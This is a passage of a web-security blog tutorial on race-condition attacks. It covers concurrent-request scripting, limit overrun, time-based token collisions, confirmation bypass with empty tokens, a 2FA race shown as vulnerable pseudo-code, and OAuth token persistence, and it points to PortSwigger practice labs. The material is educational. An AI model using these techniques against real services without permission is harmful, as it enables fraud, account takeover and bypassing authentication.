</span>        <span class="n">results</span> <span class="o">=</span> <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">gather</span><span class="p">(</span><span class="o">*</span><span class="n">tasks</span><span class="p">,</span> <span class="n">return_exceptions</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

        <span class="c1"># Print results
</span>        <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
            <span class="nf">print</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>

        <span class="c1"># Async2sync sleep
</span>        <span class="k">await</span> <span class="n">asyncio</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
    <span class="nf">print</span><span class="p">(</span><span class="n">results</span><span class="p">)</span>

<span class="n">asyncio</span><span class="p">.</span><span class="nf">run</span><span class="p">(</span><span class="nf">main</span><span class="p">())</span>
</code></pre></div></div> <h2 id="rc-methodology"><strong>RC Methodology</strong></h2> <h3 id="limit-overrun--toctou">Limit-overrun / TOCTOU</h3> <p>This is the most basic type of race condition where <strong>vulnerabilities</strong> that <strong>appear</strong> in places that <strong>limit the number of times you can perform an action</strong>. Like using the same discount code in a web store several times. A very easy example can be found in <a href="https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43" rel="external nofollow noopener" target="_blank"><strong>this report</strong></a> or in <a href="https://hackerone.com/reports/759247" rel="external nofollow noopener" target="_blank"><strong>this bug</strong></a><strong>.</strong></p> <p>There are many variations of this kind of attack, including:</p> <ul> <li>Redeeming a gift card multiple times</li> <li>Rating a product multiple times</li> <li>Withdrawing or transferring cash in excess of your account balance</li> <li>Reusing a single CAPTCHA solution</li> <li>Bypassing an anti-brute-force rate limit</li> </ul> <h3 id="hidden-substates"><strong>Hidden substates</strong></h3> <p>Exploiting complex race conditions often involves taking advantage of brief opportunities to interact with hidden or <strong>unintended machine substates</strong>. Here’s how to approach this:</p> <ol> <li> <strong>Identify Potential Hidden Substates</strong> <ul> <li>Start by pinpointing endpoints that modify or interact with critical data, such as user profiles or password reset processes. Focus on: <ul> <li> <strong>Storage</strong>: Prefer endpoints that manipulate server-side persistent data over those handling data client-side.</li> <li> <strong>Action</strong>: Look for operations that alter existing data, which are more likely to create exploitable conditions compared to those that add new data.</li> <li> <strong>Keying</strong>: Successful attacks usually involve operations keyed on the same identifier, e.g., username or reset token.</li> </ul> </li> </ul> </li> <li> <strong>Conduct Initial Probing</strong> <ul> <li>Test the identified endpoints with race condition attacks, observing for any deviations from expected outcomes. Unexpected responses or changes in application behavior can signal a vulnerability.</li> </ul> </li> <li> <strong>Demonstrate the Vulnerability</strong> <ul> <li>Narrow down the attack to the minimal number of requests needed to exploit the vulnerability, often just two. This step might require multiple attempts or automation due to the precise timing involved.</li> </ul> </li> </ol> <h3 id="time-sensitive-attacks">Time Sensitive Attacks</h3> <p>Precision in timing requests can reveal vulnerabilities, especially when predictable methods like timestamps are used for security tokens. For instance, generating password reset tokens based on timestamps could allow identical tokens for simultaneous requests.</p> <p><strong>To Exploit:</strong></p> <ul> <li>Use precise timing, like a single packet attack, to make concurrent password reset requests. Identical tokens indicate a vulnerability.</li> </ul> <p><strong>Example:</strong></p> <ul> <li>Request two password reset tokens at the same time and compare them. Matching tokens suggest a flaw in token generation.</li> </ul> <p><strong>Check this</strong> <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities" rel="external nofollow noopener" target="_blank"><strong>PortSwigger Lab</strong></a> <strong>to try this.</strong></p> <h2 id="hidden-substates-case-studies">Hidden substates case studies</h2> <h3 id="pay--add-an-item">Pay &amp; add an Item</h3> <p>Check this <a href="https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation" rel="external nofollow noopener" target="_blank"><strong>PortSwigger Lab</strong></a> to see how to <strong>pay</strong> in a store and <strong>add an extra</strong> item you that <strong>won’t need to pay for it</strong>.</p> <h3 id="confirm-other-emails">Confirm other emails</h3> <p>The idea is to <strong>verify an email address and change it to a different one at the same time</strong> to find out if the platform verifies the new one changed.</p> <h3 id="change-email-to-2-emails-addresses-cookie-based">Change email to 2 emails addresses Cookie based</h3> <p>According to <a href="https://portswigger.net/research/smashing-the-state-machine" rel="external nofollow noopener" target="_blank"><strong>this research</strong></a> Gitlab was vulnerable to a takeover this way because it might <strong>send</strong> the <strong>email verification token of one email to the other email</strong>.</p> <p><strong>Check this</strong> <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint" rel="external nofollow noopener" target="_blank"><strong>PortSwigger Lab</strong></a> <strong>to try this.</strong></p> <h3 id="hidden-database-states--confirmation-bypass">Hidden Database states / Confirmation Bypass</h3> <p>If <strong>2 different writes</strong> are used to <strong>add</strong> <strong>information</strong> inside a <strong>database</strong>, there is a small portion of time where <strong>only the first data has been written</strong> inside the database. For example, when creating a user the <strong>username</strong> and <strong>password</strong> might be <strong>written</strong> and <strong>then the token</strong> to confirm the newly created account is written. This means that for a small time the <strong>token to confirm an account is null</strong>.</p> <p>Therefore <strong>registering an account and sending several requests with an empty token</strong> (<code class="language-plaintext highlighter-rouge">token=</code> or <code class="language-plaintext highlighter-rouge">token[]=</code> or any other variation) to confirm the account right away could allow to c<strong>onfirm an account</strong> where you don’t control the email.</p> <p><strong>Check this</strong> <a href="https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction" rel="external nofollow noopener" target="_blank"><strong>PortSwigger Lab</strong></a> <strong>to try this.</strong></p> <h3 id="bypass-2fa">Bypass 2FA</h3> <p>The following pseudo-code is vulnerable to race condition because in a very small time the <strong>2FA is not enforced</strong> while the session is created:</p> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">userid</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="p">.</span><span class="n">userid</span>
<span class="k">if</span> <span class="n">user</span><span class="p">.</span><span class="n">mfa_enabled</span><span class="p">:</span>
    <span class="n">session</span><span class="p">[</span><span class="sh">'</span><span class="s">enforce_mfa</span><span class="sh">'</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="c1"># generate and send MFA code to user
</span>    <span class="c1"># redirect browser to MFA code entry form
</span></code></pre></div></div> <h3 id="oauth2-eternal-persistence">OAuth2 eternal persistence</h3> <p>There are several <a href="https://en.wikipedia.org/wiki/List_of_OAuth_providers" rel="external nofollow noopener" target="_blank"><strong>OAUth providers</strong></a>. Theses services will allow you to create an application and authenticate users that the provider has registered. In order to do so, the <strong>client</strong> will need to <strong>permit your application</strong> to access some of their data inside of the <strong>OAUth provider</strong>.<br> So, until here just a common login with google/linkedin/github… where you are prompted with a page saying: “<em>Application &lt;InsertCoolName&gt; wants to access you information, do you want to allow it?</em>”</p> <h4 id="race-condition-in-authorization_code">Race Condition in <code class="language-plaintext highlighter-rouge">authorization_code</code> </h4> <p>The <strong>problem</strong> appears when you <strong>accept it</strong> and automatically sends an <strong><code class="language-plaintext highlighter-rouge">authorization_code</code></strong> to the malicious application. Then, this <strong>application abuses a Race Condition in the OAUth service provider to generate more that one AT/RT</strong> (<em>Authentication Token/Refresh Token</em>) from the <strong><code class="language-plaintext highlighter-rouge">authorization_code</code></strong> for your account. Basically, it will abuse the fact that you have accept the application to access your data to <strong>create several accounts</strong>. Then, if you <strong>stop allowing the application to access your data one pair of AT/RT will be deleted, but the other ones will still be valid</strong>.</p> <h4 id="race-condition-in-refresh-token">Race Condition in <code class="language-plaintext highlighter-rouge">Refresh Token</code> </h4> <p>Once you have <strong>obtained a valid RT</strong> you could try to <strong>abuse it to generate several AT/RT</strong> and <strong>even if the user cancels the permissions</strong> for the malicious application to access his data, <strong>several RTs will still be valid.</strong></p> <h2 id="rc-in-websockets"><strong>RC in WebSockets</strong></h2> <p>In <a href="https://github.com/redrays-io/WS_RaceCondition_PoC" rel="external nofollow noopener" target="_blank"><strong>WS_RaceCondition_PoC</strong></a> you can find a PoC in Java to send websocket messages in <strong>parallel</strong> to abuse <strong>Race Conditions also in Web Sockets</strong>.</p> <h2 id="references">References</h2> <ul> <li><a href="https://hackerone.com/reports/759247" rel="external nofollow noopener" target="_blank">https://hackerone.com/reports/759247</a></li> <li><a href="https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html" rel="external nofollow noopener" target="_blank">https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html</a></li> <li><a href="https://hackerone.com/reports/55140" rel="external nofollow noopener" target="_blank">https://hackerone.com/reports/55140</a></li> <li><a href="https://portswigger.net/research/smashing-the-state-machine" rel="external nofollow noopener" target="_blank">https://portswigger.net/research/smashing-the-state-machine</a></li> <li><a href="https://portswigger.net/web-security/race-conditions" rel="external nofollow noopener" target="_blank">https://portswigger.net/web-security/race-conditions</a></li> <li><a href="https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/" rel="external nofollow noopener" target="_blank">https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>